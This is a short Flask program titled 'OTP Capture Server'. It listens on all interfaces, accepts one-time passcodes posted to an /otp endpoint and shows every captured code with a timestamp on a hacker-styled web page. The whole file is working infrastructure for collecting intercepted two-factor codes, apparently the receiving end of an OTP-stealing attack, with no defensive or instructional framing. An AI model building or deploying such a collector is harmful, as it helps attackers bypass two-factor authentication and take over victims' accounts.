from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

otp_log = []  # Store (timestamp, otp) tuples

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>OTP Capture Server</title>
    <style>
        body {
            background-color: black;
            color: #00FF00;
            font-family: 'Courier New', Courier, monospace;
            padding: 40px;
        }
        h1 {
            font-size: 48px;
            margin-bottom: 20px;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            font-size: 28px;
        }
        th, td {
            border: 2px solid #00FF00;
            padding: 15px;
            text-align: left;
        }
        th {
            background-color: #000000;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>📩 OTP Capture Server</h1>
    <table>
        <tr>
            <th>Timestamp</th>
            <th>OTP</th>
        </tr>
        {% for timestamp, otp in otp_log %}
        <tr>
            <td>{{ timestamp }}</td>
            <td>{{ otp }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def home():
    return render_template_string(HTML_TEMPLATE, otp_log=otp_log)

@app.route('/otp', methods=['POST'])
def receive_otp():
    try:
        otp = request.data.decode('utf-8').strip()
        print(f"[+] OTP received: {otp}")
        if otp:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            otp_log.append((timestamp, otp))
            return 'OTP received', 200
        return 'No OTP provided', 400
    except Exception as e:
        print(f"[!] Error: {e}")
        return 'Internal Server Error', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5050)
